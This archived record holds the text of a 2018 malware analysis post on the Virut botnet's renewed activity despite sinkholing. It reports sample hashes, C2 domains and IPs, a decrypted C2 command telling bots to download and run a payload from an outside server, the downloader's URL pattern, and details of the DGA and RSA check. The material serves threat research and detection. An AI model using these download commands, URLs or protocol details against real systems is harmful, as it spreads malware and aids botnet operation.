{
    "id": "c118b6bb-2477-4903-874b-db7167dec060",
    "created_at": "2023-01-12T15:00:18.652571Z",
    "updated_at": "2025-03-27T02:05:57.016024Z",
    "deleted_at": null,
    "sha1_hash": "f12feaf6983ff792549b129ccac903a5f632d4ed",
    "title": "2018-11-30 - Virut Resurrects -- Musings on long-term sinkholing",
    "authors": "",
    "file_creation_date": "2022-05-27T23:19:22Z",
    "file_modification_date": "2022-05-27T23:19:22Z",
    "file_size": 392896,
    "plain_text": "# Virut Resurrects -- Musings on long-term sinkholing\n\n**chrisdietri.ch/post/virut-resurrects/**\n\nChristian J. Dietrich November 30, 2018\n\nNov 30, 2018 8 min read\n\n[Virut is a botnet malware family which has initially been observed 13 years ago, in 2006.](https://securelist.com/review-of-the-virus-win32-virut-ce-malware-sample/36305/)\n[Traditionally, it spreads as a file-infecting virus, and has monetized pay-per-install schemes](https://krebsonsecurity.com/2013/01/polish-takedown-targets-virut-botnet/)\n[and information theft. Although believed to be dead by many following a major sinkholing](https://www.cert.pl/en/news/single/virut-botnet-report/)\n[operation conducted by NASK/CERT Polska in 2013, events over the last few months](http://web.archive.org/web/20130928091944/http://www.cert.pl/PDF/Report_Virut_EN.pdf)\n[indicate an uptick in activity. Earlier in 2018, an unusual drive-by attack with a Chinese nexus](https://blog.malwarebytes.com/threat-analysis/2018/03/blast-from-the-past-stowaway-virut-delivered-with-chinese-ddos-bot/)\n[involved dropping a Virut sample. Having dealt with takedowns before and tracking botnets,](https://chrisdietri.ch/post/tracking-botnet-command-and-control/)\nthis piqued my interest.\n\n## Recent activity\n\n\n-----\n\nFurther research shows that although the sinkholing from 2013 for C2 domains ending in\n```\n.pl, .at, and .ru is still in place, some variants manage to evade and actively\n\n```\ndistribute additional malware as of November 2018. Interestingly, the C2 protocol has not\nchanged. A recent Virut binary has the SHA-256 hash\n054eeaa9f120f3613cf06ad010c58adf025c4f8c03dcc6da6acd567be27e87aa and was first\nsubmitted to VirusTotal in November 2018. On 32-bit Windows, it injects code into the\n```\nwinlogon.exe process. To connect to the C2 server, it uses the domain tbsgay[.]com\n\n```\nwhich at the time of analysis resolved to the IP address 148.251.79[.]206. The full set of\nhardcoded C2 domains in this sample is:\n```\ntbsgay[.]com\nffiuli[.]com\nlexfal[.]com\nsexpsa[.]com\nvolmio[.]com\n\n```\nOnce connected, the server instructs to download and execute a PE file from\n```\nhttp://77.73.69[.]179:9/mk/p0.php?a=31 . A hexdump of the decrypted C2 command\n\n```\nlooks as follows:\n```\n0000  3A 75 2E 20 50 52 49 56 4D 53 47 20 62 6E 69 78  :u. PRIVMSG bnix\n0010  79 71 6C 7A 20 3A 21 67 65 74 20 68 74 74 70 3A  yqlz :!get http:\n0020  2F 2F 37 37 2E 37 33 2E 36 39 2E 31 37 39 3A 39  //77.73.69.179:9\n0030  2F 6D 6B 2F 70 30 2E 70 68 70 3F 61 3D 33 31 0D  /mk/p0.php?a=31.\n0040  0A                         .\n\n```\nThe downloaded file (SHA-256\nfb0852761cfb7bfa34be168452891d5849574254f8623192798f1c03c2777688) is tiny, just 4\nKB in size, packed with UPX and has a recent build timestamp of 2018-11-01 22:54:34 UTC.\nIt acts as a downloader to retrieve further payloads via HTTP, using the User-Agent\n```\nAdInstall . The URLs follow the pattern:\nhttp://77.73.69.179:9/mk/p%u.php?a=%u\n\n```\nThe first `%u is a counter where the values 1 and 2 were observed. Note that the initial`\ndownload URL that Virut distributed follows the same pattern except for the counter value\nbeing 0.\n\nThe second `%u is a value from a reserved area named` `e_res2 in the` [DOS header (offset](https://chrisdietri.ch/img/image_dos_header.png)\n0x3a), preceding the `e_lfanew field. The value is read from memory using`\n```\n*((_WORD *)GetModuleHandleA(0) + 0x1d)\n\n```\nand was observed to be 31 exclusively. Typically, `e_res2 is set to all zeroes in regular PE`\nfiles as it is not used. In other words, a nonzero value is uncommon. The purpose of\nretrieving this value is unclear but it could be an attempt by the operator to ensure that\nfurther samples are only downloaded by previously distributed samples. However, even with\nthe second parameter set to 0 the payload is served\n\n\n-----\n\nThe downloads yield two payload files:\n```\n6dadd08b523be5bc41162cd4ca35afabd4c847733ad8df88362de1ee3b383e96 p0.php?a=31\n |\n +- 781c12e2ab1c08d885c002eee8ef9c03e92c9c196fe5a576399080d10fbaa693 p2.php?a=31\n | +-- build timestamp 2018-11-02 13:47:52 UTC\n |\n +- 6dadd08b523be5bc41162cd4ca35afabd4c847733ad8df88362de1ee3b383e96 p1.php?a=31\n  +-- build timestamp 2018-11-29 21:54:49 UTC\n\n```\nThese files are associated with malicious activities described by Fortinet, based on a\n[common user agent string Medunja Solodunnja 6.0.0 that is used in subsequent C2](https://www.fortinet.com/blog/threat-research/cookie-maker-inside-the-google-docs-malicious-network.html)\ncommunication with the host static.76.102.69.159.clients.your-server[.]de (resolving to\n159.69.102[.]76).\n\nThe Fortinet researchers suspect a Ukrainian nexus of the payload files based on a cookie\nmaker in Lviv, Ukraine, with the same name as the user agent, and domain registration data.\nIt is unclear if the payload is operated by the same entity as the Virut activity, though. In\n[2013, Brian Krebs mentioned research by Team Furry which suggests a possible Polish](https://krebsonsecurity.com/2013/01/polish-takedown-targets-virut-botnet/)\nnexus of the Virut operators.\n\n## Looking back\n\nBefore the sinkholing in 2013, Virut has often ranked in the malware family top-ten which by\nitself justified regular scrutiny. With the sinkholing in place, it may have disappeared from\npeople’s radar. How and when did Virut come to life again?\n\nPivoting off of the indicators from above, Virut appears to have resumed its activity slowly\nover the last year. Although less in volume, active C2 servers occasionally appear since end\nof 2017. For example, the IP address 77.73.69[.]179 was observed in a likely Virut execution\nfrom [February 2018 and as part of a Virut C2 command](https://www.reverse.it/sample/e2cb9030807fb3bc4dc54a884187a47854d537678660bdc4906ea6028e1f4687?environmentId=100#contacted-hosts)\n```\nhttp://77.73.69[.]179:9/mk/li.jpg in the end of 2017.\n\n```\nSimilarly, the Virut C2 at 148.251.79.206 appears to have operated since late 2017, with\nnotably increased activity in November 2018.\n\nAnother interesting case is the Virut C2 domain gik.alr4[.]ru. It issued commands in early\n2013, while resolving to 178.132.202[.]196. At the end of January 2013, it was sinkholed and\nresolved to 148.81.111.111, the IP address of the CERT.PL sinkhole at the time. Fast forward\nto October 2018, and the domain points to a C2 server (212.109.221[.]97) issuing the\ncommand `!get http://77.73.69[.]179:9/mk/p0.php?a=31 .`\n\n## A bit of Virut history\n\n\n-----\n\n[Probably one of the first technical descriptions on Virut was published by Joe Stewart in](https://www.secureworks.com/research/virut-encryption-analysis)\n2009, motivated by a shift from a plaintext C2 protocol to encrypted C2. His report details an\ninteresting trick on the encryption in Virut C2 communication: Since the 4-byte session key is\npseudorandomly chosen by each bot, and never transmitted to the C2 server, the server is\nleft with a known plaintext cryptanalysis attack to reveal it. Given the underlying IRC-like\nprotocol with the string `NICK at the start of the first message, a known plaintext attack`\nreveals the key. Once recovered, the session key is used to decrypt the remainder of the\nrequest as well as to encrypt the responses towards the bot.\n\nThe following timeline highlights notable developments.\n\nTo increase resilience and impede sinkholing, Virut contains a date-seeded domain\ngeneration algorithm (DGA) that generates up to 10,000 domains per day of the form `[a-z]`\n\n`{6}.com .` [Daniel Plohmann and](https://www.usenix.org/system/files/conference/usenixsecurity16/sec16_paper_plohmann.pdf) [others documented that Virut’s DGA is particularly prone to](https://blogs.akamai.com/2018/01/a-death-match-of-domain-generation-algorithms.html)\ndomain collisions, due to the small length and the high number of generated domains. The\nrecent sample still contains the DGA. However, it seems that they were not needed to\nestablish C2 comms as the hardcoded domains were resolvable.\n\nTo prevent from hijacking the C2 channel, an RSA signature verification step was introduced.\nA valid Virut C2 server must provide a signed SHA-256 hash of the C2 domain. The signed\nhash is verified by the bot before accepting commands. This step is vulnerable to a replay\nattack and was most likely intended to gracefully handle accidental collisions between a\n[DGA-generated domain and a completely unrelated domain. Nicolas Falliere documented](https://www.symantec.com/connect/blogs/w32virut-using-cryptography-prevent-domain-hijacking)\nthis in August 2011. The same 2048-bit RSA modulus is still used in the current sample:\n\n\n-----\n\n```\n# RSA modulus\n57 06 4C EC 3B 33 66 6C B5 DD 54 B5 71 4E 78 86\n42 50 FE 33 14 6B 02 60 0F 27 AA 81 71 AD C2 8B\n0B 57 39 4D 30 D0 8A 98 4D 6F 64 82 5C C9 51 49\n83 C0 5E 43 3E 88 ED 6D 38 01 68 19 42 4C AA 61\n59 DF 28 99 DA 63 3B 6C 0A C5 90 06 39 93 3F 5E\nF6 75 67 37 DA F5 79 07 63 9F 7A D3 D5 AB 84 BE\n61 C0 5C 43 16 B6 7A 79 F2 72 76 D9 74 CF C3 2B\nDB 61 43 34 72 3E 4B 34 9B 2D 77 09 A0 0E 80 52\n20 F5 73 CF BC 0F EF 8C 09 EB 3B FA A3 8F 87 8A\nCF D2 4A 19 74 9D C5 FD 9E E3 DE 55 8E BE C1 B6\nE8 B6 E6 4B 29 90 73 FC 0D 77 59 2C D2 95 C2 16\nE2 CB 35 19 E5 6B DB ED 72 4D 92 45 F1 9A 99 1C\n3D 24 38 38 D7 D8 77 4F 74 1B 82 0A 00 CF F7 2A\nD8 CD E6 F3 05 FA 65 CE 08 8D 28 2F 39 C6 F3 E9\nF2 89 8F 4C C5 8C 11 AA 2A AA 69 19 3C 95 70 05\n4C F9 BD 36 CD 60 20 FD AC 92 6A 1B 3B 7C 4B BB\n\n## Conclusion\n\n```\nRecovering after a multi-year slow-down seems to be an attractive option for botnet\noperators. Malware researchers who tracked such a botnet in the past may have shifted\nfocus or even moved on to other topics. In addition, an uptick in activity may go unnoticed\nwith sinkholing in place, unless carefully inspected.\n\nNo question, sinkholing botnets is tough, and there are many parties doing a great job to\nachieve it. Sustaining a sinkholing effort is even harder, especially if not paralleled by law\nenforcement action. Although sinkholing incurs additional cost on the adversary, a patient\noperator may withstand sinkholing. In the end, sinkholing a botnet of certain impact is\ncertainly useful and necessary. It seems in addition to identifying and countering new threats,\nthe anti-malware community may also need to monitor contained threats on a long-term\nbasis.\n\n## Indicators\n\nThe following is a summary of the indicators mentioned above.\n\n\n-----\n\n```\n054eeaa9f120f3613cf06ad010c58adf025c4f8c03dcc6da6acd567be27e87aa\nfb0852761cfb7bfa34be168452891d5849574254f8623192798f1c03c2777688\n781c12e2ab1c08d885c002eee8ef9c03e92c9c196fe5a576399080d10fbaa693\n6dadd08b523be5bc41162cd4ca35afabd4c847733ad8df88362de1ee3b383e96\ntbsgay.com\nffiuli.com\nlexfal.com\nsexpsa.com\nvolmio.com\n148.251.79.206\n77.73.69.179\nstatic.76.102.69.159.clients.your-server.de\n159.69.102.76\ngik.alr4.ru\n212.109.221.97\n\n```\n[A related sample execution can be found here.](https://any.run/report/47d0a5c63cb185e28c6c88ec90c9a5207d047ed420808707066da928905bb1bf/0f31b97a-cb33-41b3-b86f-1e9b6424caaf#processes)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-11-30 - Virut Resurrects -- Musings on long-term sinkholing.pdf"
    ],
    "report_names": [
        "2018-11-30 - Virut Resurrects -- Musings on long-term sinkholing.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535618,
    "ts_updated_at": 1743041157,
    "ts_creation_date": 1653693562,
    "ts_modification_date": 1653693562,
    "files": {
        "pdf": "https://archive.orkl.eu/f12feaf6983ff792549b129ccac903a5f632d4ed.pdf",
        "text": "https://archive.orkl.eu/f12feaf6983ff792549b129ccac903a5f632d4ed.txt",
        "img": "https://archive.orkl.eu/f12feaf6983ff792549b129ccac903a5f632d4ed.jpg"
    }
}